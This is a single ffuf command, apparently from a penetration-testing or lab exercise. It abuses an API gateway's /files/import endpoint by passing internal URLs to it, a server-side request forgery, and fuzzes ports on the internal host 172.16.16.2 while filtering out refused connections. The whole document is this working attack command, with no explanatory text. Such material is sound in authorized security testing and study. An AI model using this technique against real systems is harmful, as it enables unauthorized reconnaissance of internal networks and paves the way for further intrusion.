ffuf -X POST -u http://apigateway:8000/files/import \
  -d '{"url":"http://172.16.16.2:FUZZ"}' \
  -H "Content-Type:application/json" \
  -w ./ports.txt \
  -fr "ECONNREFUSED"  -timeout 5 -t 20
